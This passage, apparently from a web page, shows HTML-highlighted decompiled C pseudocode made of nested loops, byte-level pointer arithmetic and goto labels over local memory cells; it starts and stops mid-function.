__int8)v127[<span class="hljs-number">5</span>];</span><br><span class="line">        v126 = v141;</span><br><span class="line">        v130 = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    v142 = <span class="hljs-number">0</span>;</span><br><span class="line">    v143 = <span class="hljs-number">2</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v144 = v143;</span><br><span class="line">        --v126;</span><br><span class="line">        v143 = (<span class="hljs-keyword">unsigned</span> __int8)v127[<span class="hljs-number">1</span>];</span><br><span class="line">        <span class="hljs-keyword">if</span> ( (_BYTE)v144 == <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          v145 = <span class="hljs-number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          v143 = v144 + v143 - <span class="hljs-number">1</span>;</span><br><span class="line">          v145 = v144 - <span class="hljs-number">2</span>;</span><br><span class="line">          v127[<span class="hljs-number">1</span>] = v143;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> ( (_BYTE)v143 )</span><br><span class="line">          v127[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        ++v142;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( !(_BYTE)v145 )</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        v141 -= v145;</span><br><span class="line">        v142 += <span class="hljs-number">2</span> * v145;</span><br><span class="line">        v127[<span class="hljs-number">2</span>] = v141;</span><br><span class="line">        v143 += <span class="hljs-number">2</span> * ~v145 + <span class="hljs-number">2</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( !v126 )</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_375;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v126 );</span><br><span class="line">LABEL_375:</span><br><span class="line">    v127[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v127[<span class="hljs-number">4</span>] = v142;</span><br><span class="line">    *(v127 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v141 )</span><br><span class="line">    {</span><br><span class="line">      v127[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v127 - <span class="hljs-number">1</span>) = v141;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v142 )</span><br><span class="line">    {</span><br><span class="line">      v132 -= v142;</span><br><span class="line">      v127[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      v127[<span class="hljs-number">5</span>] = v132;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !(_BYTE)v132 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_441;</span><br><span class="line">LABEL_380:</span><br><span class="line">    v127[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v132 = <span class="hljs-number">1</span>;</span><br><span class="line">    v127[<span class="hljs-number">3</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v134 == <span class="hljs-number">0xF8</span> )</span><br><span class="line">    {</span><br><span class="line">      ++v133;</span><br><span class="line">      v127[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      v134 = <span class="hljs-number">-7</span>;</span><br><span class="line">      v127[<span class="hljs-number">7</span>] = v133;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_388;</span><br><span class="line">    }</span><br><span class="line">LABEL_381:</span><br><span class="line">    v127[<span class="hljs-number">4</span>] = v135;</span><br><span class="line">    v146 = (<span class="hljs-keyword">unsigned</span> __int8)v127[<span class="hljs-number">2</span>];</span><br><span class="line">    v127[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( (_BYTE)v132 )</span><br><span class="line">      {</span><br><span class="line">        v146 += v132;</span><br><span class="line">        *((_WORD *)v127 + <span class="hljs-number">1</span>) = (<span class="hljs-keyword">unsigned</span> __int8)v146;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !(_BYTE)v146 )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      v132 = <span class="hljs-number">2</span> * v146;</span><br><span class="line">      v127[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      v146 = <span class="hljs-number">0</span>;</span><br><span class="line">      v127[<span class="hljs-number">3</span>] = v132;</span><br><span class="line">      <span class="hljs-built_in">LOBYTE</span>(v135) = v135 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !(_BYTE)v135 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_386;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">LOBYTE</span>(v135) = v135 - <span class="hljs-number">1</span>;</span><br><span class="line">      v132 = v135;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( (_BYTE)v135 );</span><br><span class="line">LABEL_386:</span><br><span class="line">    v127[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v132 )</span><br><span class="line">    {</span><br><span class="line">      v133 += v132;</span><br><span class="line">      v127[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      v127[<span class="hljs-number">7</span>] = v133;</span><br><span class="line">      <span class="hljs-built_in">LOBYTE</span>(v134) = v134 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !(_BYTE)v134 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_392;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_388;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">LOBYTE</span>(v134) = v134 + <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v134 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_388;</span><br><span class="line">LABEL_392:</span><br><span class="line">    *v127 = v143;</span><br><span class="line">    v127[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (_BYTE)v133 )</span><br><span class="line">    {</span><br><span class="line">      v131 += v133;</span><br><span class="line">      v127[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v127 - <span class="hljs-number">2</span>) = v131;</span><br><span class="line">    }</span><br><span class="line">    v147 = v127 - <span class="hljs-number">4</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(v127 - <span class="hljs-number">4</span>) )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v141 )</span><br><span class="line">          v147[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v131 )</span><br><span class="line">        {</span><br><span class="line">          v147[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">          v147[<span class="hljs-number">3</span>] = v131;</span><br><span class="line">        }</span><br><span class="line">        v148 = *++v147;</span><br><span class="line">        v159 = v148 + <span class="hljs-number">1</span>;</span><br><span class="line">        *v147 = v148 + <span class="hljs-number">1</span>;</span><br><span class="line">        v158 = v148 + <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v148 != <span class="hljs-number">-1</span> )</span><br><span class="line">        {</span><br><span class="line">          *v147 = <span class="hljs-number">0</span>;</span><br><span class="line">          v147[<span class="hljs-number">1</span>] = v159;</span><br><span class="line">        }</span><br><span class="line">        v149 = *(v147 - <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>;</span><br><span class="line">        *(v147 - <span class="hljs-number">1</span>) = v149;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( !v149 )</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        *v147 = v149;</span><br><span class="line">        v141 = v147[<span class="hljs-number">3</span>];</span><br><span class="line">        *(v147 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      v141 = v147[<span class="hljs-number">3</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v158 = *(v127 - <span class="hljs-number">3</span>);</span><br><span class="line">      v159 = v158;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v141 )</span><br><span class="line">      v147[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(v147 - <span class="hljs-number">75</span>) )</span><br><span class="line">      *(v147 - <span class="hljs-number">75</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v131 )</span><br><span class="line">    {</span><br><span class="line">      *(v147 - <span class="hljs-number">75</span>) = v131;</span><br><span class="line">      *v147 = v131;</span><br><span class="line">      *((_WORD *)v147 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    v150 = v147 + <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v158 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v131 )</span><br><span class="line">        {</span><br><span class="line">          v151 = *v150;</span><br><span class="line">          v131 += *(v150 - <span class="hljs-number">2</span>);</span><br><span class="line">          *(v150 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">          *(v150 - <span class="hljs-number">2</span>) = v131;</span><br><span class="line">          v152 = v151 - <span class="hljs-number">1</span>;</span><br><span class="line">          *v150 = v151 - <span class="hljs-number">1</span>;</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v151 == <span class="hljs-number">1</span> )</span><br><span class="line">            <span class="hljs-keyword">goto</span> LABEL_417;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          v153 = *v150;</span><br><span class="line">          v131 = *(v150 - <span class="hljs-number">2</span>);</span><br><span class="line">          v152 = *v150 - <span class="hljs-number">1</span>;</span><br><span class="line">          *v150 = v152;</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v153 == <span class="hljs-number">1</span> )</span><br><span class="line">          {</span><br><span class="line">LABEL_417:</span><br><span class="line">            --v150;</span><br><span class="line">            v159 = <span class="hljs-number">0</span>;</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        *--v150 = v152;</span><br><span class="line">        v150[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v131 )</span><br><span class="line">      *(v150 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    v154 = *(v150 - <span class="hljs-number">38</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v154 )</span><br><span class="line">    {</span><br><span class="line">      v155 = v154 + <span class="hljs-number">1</span>;</span><br><span class="line">      *(v150 - <span class="hljs-number">1</span>) = v154;</span><br><span class="line">      *(v150 - <span class="hljs-number">38</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      *v150 = v154 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v154 == <span class="hljs-number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        *(v150 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        v112 = <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        *v150 = <span class="hljs-number">0</span>;</span><br><span class="line">        *(v150 - <span class="hljs-number">38</span>) = v155;</span><br><span class="line">        *(v150 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">LABEL_423:</span><br><span class="line">        *(v150 - <span class="hljs-number">1</span>) = v155;</span><br><span class="line">        *(v150 - <span class="hljs-number">38</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v155 )</span><br><span class="line">        {</span><br><span class="line">          *(v150 - <span class="hljs-number">38</span>) = v155;</span><br><span class="line">          v112 = v155;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          v112 = <span class="hljs-number">0</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v155 = v159 + <span class="hljs-number">1</span>;</span><br><span class="line">      *v150 = v159 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v159 != <span class="hljs-number">-1</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_423;</span><br><span class="line">      v112 = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    v4 = v150[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">    *(_WORD *)v150 = <span class="hljs-number">36</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">      v150[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v156 = <span class="hljs-number">36</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v155 )</span><br><span class="line">      {</span><br><span class="line">LABEL_429:</span><br><span class="line">        *(v150 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        v150[<span class="hljs-number">2</span>] = v155;</span><br><span class="line">        *(v150 - <span class="hljs-number">1</span>) = v155;</span><br><span class="line">        v157 = v155;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v157 = <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v157 )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">while</span> ( --v156 )</span><br><span class="line">        {</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v155 )</span><br><span class="line">            <span class="hljs-keyword">goto</span> LABEL_429;</span><br><span class="line">        }</span><br><span class="line">        *(_WORD *)v150 = <span class="hljs-number">256</span>;</span><br><span class="line">        v72 = v150 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v72 = <span class="hljs-number">1</span>;</span><br><span class="line">        v72[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_309;</span><br><span class="line">      }</span><br><span class="line">      --v155;</span><br><span class="line">      v150[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v150 - <span class="hljs-number">1</span>) = v155;</span><br><span class="line">      --v156;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v156 );</span><br><span class="line">    *(_WORD *)v150 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v155 )</span><br><span class="line">      *(v150 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    v72 = v150 - <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v112 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_168;</span><br><span class="line">LABEL_169:</span><br><span class="line">    v72[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    *(_WORD *)v72 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_170:</span><br><span class="line">    v75 = *(v72 - <span class="hljs-number">37</span>);</span><br><span class="line">    *v72 = <span class="hljs-number">5</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v75 )</span><br><span class="line">    {</span><br><span class="line">      v76 = v75 + <span class="hljs-number">5</span>;</span><br><span class="line">      *v72 = v76;</span><br><span class="line">      *(_WORD *)(v72 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v76 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_178;</span><br><span class="line">    }</span><br><span class="line">    v77 = v72;</span><br><span class="line">    v76 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      v72[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v76 )</span><br><span class="line">      {</span><br><span class="line">        v78 = *v72;</span><br><span class="line">        ++v76;</span><br><span class="line">        v72[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        v72[<span class="hljs-number">2</span>] = v76;</span><br><span class="line">        v79 = v78 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v72 = v78 - <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v78 == <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          ++v72;</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_176;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_175;</span><br><span class="line">      }</span><br><span class="line">      v78 = *v72;</span><br><span class="line">      v79 = *v72 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v72 = v79;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v78 != <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v76 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_175:</span><br><span class="line">        *++v72 = v78 - <span class="hljs-number">1</span>;</span><br><span class="line">        *(v72 - <span class="hljs-number">1</span>) = v79 - v78 + <span class="hljs-number">1</span>;</span><br><span class="line">        v77 = v72;</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    ++v72;</span><br><span class="line">    v76 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_176:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v77[<span class="hljs-number">3</span>] )</span><br><span class="line">      v72[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">LABEL_178:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v72[<span class="hljs-number">3</span>] )</span><br><span class="line">    {</span><br><span class="line">      v80 = *(v72 - <span class="hljs-number">75</span>);</span><br><span class="line">      v72[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v80 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_180;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v80 = *(v72 - <span class="hljs-number">75</span>);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v80 )</span><br><span class="line">      {</span><br><span class="line">LABEL_180:</span><br><span class="line">        *v72 += v80;</span><br><span class="line">        *(v72 - <span class="hljs-number">75</span>) = v80;</span><br><span class="line">        *((_WORD *)v72 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    v81 = v72 + <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v76 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v82 = *(v81 - <span class="hljs-number">1</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v82 )</span><br><span class="line">        {</span><br><span class="line">          *(v81 - <span class="hljs-number">2</span>) += v82;</span><br><span class="line">          *(v81 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        v83 = *v81;</span><br><span class="line">        v84 = *v81 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v81 = v84;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v83 == <span class="hljs-number">1</span> )</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        *--v81 = v83 - <span class="hljs-number">1</span>;</span><br><span class="line">        v81[<span class="hljs-number">1</span>] = v84 - v83 + <span class="hljs-number">1</span>;</span><br><span class="line">      }</span><br><span class="line">      --v81;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v81[<span class="hljs-number">1</span>] )</span><br><span class="line">    {</span><br><span class="line">      v85 = *(v81 - <span class="hljs-number">38</span>);</span><br><span class="line">      v81[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v85 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_188;</span><br><span class="line">LABEL_264:</span><br><span class="line">      v86 = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_193;</span><br><span class="line">    }</span><br><span class="line">    v85 = *(v81 - <span class="hljs-number">38</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v85 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_264;</span><br><span class="line">LABEL_188:</span><br><span class="line">    *v81 = v85;</span><br><span class="line">    v86 = <span class="hljs-number">0</span>;</span><br><span class="line">    *(v81 - <span class="hljs-number">38</span>) = v85;</span><br><span class="line">    v81[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      v81[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v86 )</span><br><span class="line">      {</span><br><span class="line">        v87 = *v81;</span><br><span class="line">        ++v86;</span><br><span class="line">        v81[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        v81[<span class="hljs-number">2</span>] = v86;</span><br><span class="line">        v88 = v87 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v81 = v87 - <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v87 == <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          ++v81;</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_193;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_189;</span><br><span class="line">      }</span><br><span class="line">      v87 = *v81;</span><br><span class="line">      v88 = *v81 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v81 = v88;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v87 != <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v86 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_189:</span><br><span class="line">        *++v81 = v87 - <span class="hljs-number">1</span>;</span><br><span class="line">        *(v81 - <span class="hljs-number">1</span>) = v88 - v87 + <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    ++v81;</span><br><span class="line">    v86 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_193:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v81[<span class="hljs-number">2</span>] )</span><br><span class="line">      v81[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v81[<span class="hljs-number">3</span>] )</span><br><span class="line">    {</span><br><span class="line">      v89 = *(v81 - <span class="hljs-number">33</span>);</span><br><span class="line">      v81[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v89 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_197;</span><br><span class="line">LABEL_276:</span><br><span class="line">      v89 = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v89 = *(v81 - <span class="hljs-number">33</span>);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v89 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_276;</span><br><span class="line">LABEL_197:</span><br><span class="line">      *(v81 - <span class="hljs-number">33</span>) = v89;</span><br><span class="line">      *v81 = v89;</span><br><span class="line">      *((_WORD *)v81 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    v90 = v81 + <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v86 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_202;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v89 )</span><br><span class="line">      {</span><br><span class="line">        v91 = *v90;</span><br><span class="line">        v89 += *(v90 - <span class="hljs-number">2</span>);</span><br><span class="line">        *(v90 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        *(v90 - <span class="hljs-number">2</span>) = v89;</span><br><span class="line">        v92 = v91 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v90 = v91 - <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v91 == <span class="hljs-number">1</span> )</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_201;</span><br><span class="line">      }</span><br><span class="line">      v91 = *v90;</span><br><span class="line">      v89 = *(v90 - <span class="hljs-number">2</span>);</span><br><span class="line">      v92 = *v90 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v90 = v92;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v91 != <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">LABEL_201:</span><br><span class="line">        *--v90 = v91 - <span class="hljs-number">1</span>;</span><br><span class="line">        v90[<span class="hljs-number">1</span>] = v92 - v91 + <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    --v90;</span><br><span class="line">LABEL_202:</span><br><span class="line">    v93 = *(v90 - <span class="hljs-number">2</span>);</span><br><span class="line">    v72 = v90 - <span class="hljs-number">2</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v93 )</span><br><span class="line">    {</span><br><span class="line">      v94 = v89 - v93;</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v90 - <span class="hljs-number">1</span>) = v94;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v94 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_204;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v89 )</span><br><span class="line">    {</span><br><span class="line">LABEL_204:</span><br><span class="line">      v4 = v90[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">      *(v90 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">        v90[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *(v90 - <span class="hljs-number">38</span>) )</span><br><span class="line">        *(v90 - <span class="hljs-number">38</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    v95 = *(v90 - <span class="hljs-number">39</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v95 )</span><br><span class="line">    {</span><br><span class="line">      v96 = v95 + <span class="hljs-number">1</span>;</span><br><span class="line">      *(v90 - <span class="hljs-number">39</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v90 - <span class="hljs-number">1</span>) = v96;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v96 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_210;</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      